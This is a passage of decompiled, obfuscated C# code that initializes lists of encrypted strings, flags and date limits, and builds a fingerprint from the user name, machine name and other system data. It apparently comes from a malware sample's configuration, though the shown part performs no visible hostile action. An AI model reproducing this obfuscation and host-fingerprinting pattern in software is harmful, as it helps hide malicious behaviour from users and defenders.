			HIZwQscayZMa(getString_0(107411262)),
			HIZwQscayZMa(getString_0(107411189)),
			HIZwQscayZMa(getString_0(107411148)),
			HIZwQscayZMa(getString_0(107411135)),
			HIZwQscayZMa(getString_0(107411102)),
			HIZwQscayZMa(getString_0(107411541)),
			HIZwQscayZMa(getString_0(107411508)),
			HIZwQscayZMa(getString_0(107411467)),
			HIZwQscayZMa(getString_0(107411458)),
			HIZwQscayZMa(getString_0(107411425)),
			HIZwQscayZMa(getString_0(107411352)),
			HIZwQscayZMa(getString_0(107411319)),
			HIZwQscayZMa(getString_0(107411681)),
			HIZwQscayZMa(getString_0(107410766)),
			HIZwQscayZMa(getString_0(107410757)),
			HIZwQscayZMa(getString_0(107410680)),
			HIZwQscayZMa(getString_0(107410647)),
			HIZwQscayZMa(getString_0(107410606)),
			HIZwQscayZMa(getString_0(107410597)),
			HIZwQscayZMa(getString_0(107410564)),
			HIZwQscayZMa(getString_0(107411035)),
			HIZwQscayZMa(getString_0(107410962)),
			HIZwQscayZMa(getString_0(107411648)),
			HIZwQscayZMa(getString_0(107410921)),
			HIZwQscayZMa(getString_0(107411571)),
			HIZwQscayZMa(getString_0(107410920)),
			HIZwQscayZMa(getString_0(107410887)),
			HIZwQscayZMa(getString_0(107410846)),
			HIZwQscayZMa(getString_0(107410813)),
			HIZwQscayZMa(getString_0(107410228)),
			HIZwQscayZMa(getString_0(107410187)),
			HIZwQscayZMa(getString_0(107410154)),
			HIZwQscayZMa(getString_0(107410121)),
			HIZwQscayZMa(getString_0(107410112)),
			HIZwQscayZMa(getString_0(107410039)),
			HIZwQscayZMa(getString_0(107410510))
		};
		bXbpSdhsQQQk = new List<string>
		{
			HIZwQscayZMa(zikllNgvJXLR(getString_0(107410501))),
			HIZwQscayZMa(getString_0(107410420)),
			HIZwQscayZMa(getString_0(107410327)),
			HIZwQscayZMa(getString_0(107409718)),
			HIZwQscayZMa(getString_0(107409657)),
			HIZwQscayZMa(getString_0(107409528)),
			HIZwQscayZMa(getString_0(107409979)),
			HIZwQscayZMa(getString_0(107409882)),
			HIZwQscayZMa(getString_0(107409789)),
			HIZwQscayZMa(getString_0(107409180)),
			HIZwQscayZMa(getString_0(107409087)),
			HIZwQscayZMa(getString_0(107409502)),
			HIZwQscayZMa(getString_0(107409409)),
			HIZwQscayZMa(zikllNgvJXLR(getString_0(107410501)))
		};
		xiHuEoHoRXESAY = HIZwQscayZMa(getString_0(107409312));
		hAoVEaJfEovikWoJ = new List<string>
		{
			HIZwQscayZMa(getString_0(107408655)),
			HIZwQscayZMa(getString_0(107408973)),
			HIZwQscayZMa(getString_0(107408779)),
			HIZwQscayZMa(getString_0(107408073)),
			HIZwQscayZMa(getString_0(107408423)),
			HIZwQscayZMa(getString_0(107407717))
		};
		YkLPjYDuCfAlg = new List<string>
		{
			HIZwQscayZMa(getString_0(107407523)),
			HIZwQscayZMa(getString_0(107407974)),
			HIZwQscayZMa(getString_0(107407881))
		};
		WXyemYtuBSqy = getString_0(107396694);
		RlCpaLrMWWn = getString_0(107396694);
		TcEcgQAQdsjAwX = new DateTime(2000, 1, 1);
		RNwCRPwGBq = new DateTime(2100, 1, 1);
		gdOttXkAiCtHt = getString_0(107396725);
		CtXFrubNJZZ = getString_0(107389787);
		HtBtaIplbcJ = getString_0(107396694);
		nyNaHkLePeNInG = getString_0(107396694);
		nagIxCHlSaFIy = getString_0(107396694);
		iDMbzWpNZVVVNw = getString_0(107396694);
		HIVWYaWSCMvU = getString_0(107396694);
		DzWFTAUXUsJj = getString_0(107396694);
		ewhHGOPmfx = new List<string>
		{
			getString_0(107395735),
			getString_0(107395993),
			getString_0(107395801),
			getString_0(107395362)
		};
		hyJckWvZQWcw = getString_0(107396694);
		BDRVdFdRwZNTSIubZ = getString_0(107407820);
		fiKMSHHQxtAuJr = getString_0(107396694);
		hwISOErmmXW = getString_0(107396694);
		HoENWKurOnukFU = getString_0(107396694);
		oJxmOjwwboOJ = string.Empty;
		mzZBMWoWPUw = getString_0(107396694);
		jjnkYCMBgr = getString_0(107396694);
		QgIMahSiUFcf = getString_0(107396694);
		WDlBZpIwAXQtdZ = getString_0(107393932);
		dVJverldWOjQU = getString_0(107393932);
		lBVOdMAyRgvZP = getString_0(107396694);
		rtcZjiAsAoieR = getString_0(107396725);
		HrqrtPhWTAbK = getString_0(107396694);
		WbmqlEKxtL = getString_0(107396694);
		LYnLSPynFqmDEg = getString_0(107396694);
		lMoyvIhQlOwWjX = getString_0(107407847);
		ZsKnSHGREjt = getString_0(107396694);
		UXRLGpjTgaHE = getString_0(107396694);
		NGRRApkWgPFBD = getString_0(107407798);
		ZsLqPlmZKQuFKP = getString_0(107396694);
		WRquJhjHJBI = getString_0(107396694);
		drHBNZfPBu = getString_0(107396694);
		sHBwSrfcnHkEPy = getString_0(107396694);
		qQnnlrkzDnWviZ = getString_0(107407809);
		iQVfjjPnVtUWK = getString_0(107396725);
		PBiVvwWfdkzY = getString_0(107396694);
		HSXeaxeEXpTrQ = getString_0(107396694);
		QiRNmqPOWrMtCh = getString_0(107396694);
		KPxzLUKEmVdQyD = new string[0];
		JvyLVvgwySTVfgs = getString_0(107396694);
		HzPgxRaUZqk = true;
		taEztzoIfcK = getString_0(107396694);
		DUcsRxUyUOuZr = false;
		FCZWstOVKY = false;
		iGpFNBdltsqHeT = true;
		ebdecQEFHvifCf = false;
		fNCnNJWJkI = getString_0(107407764);
		diLbjzXQsjUvfr = false;
		RUJUVUvIRWp = false;
		jHuzdxCmiAYg = false;
		HPWnUWTgHq = false;
		StzmabfzgZhvrc = true;
		JgfbxDYAciLO = getString_0(107407775) + Environment.UserName + getString_0(107407730) + Environment.MachineName + getString_0(107407741) + ceWGkLeWGlSf.oIVDOcdsSwsdKp() + getString_0(107407192);
		UgmMuhbgyRVLXd = new List<string>();
		LOeInkCeZkNU = new List<string>();
		pTsRRtezFMz = new List<string>();
	}
}
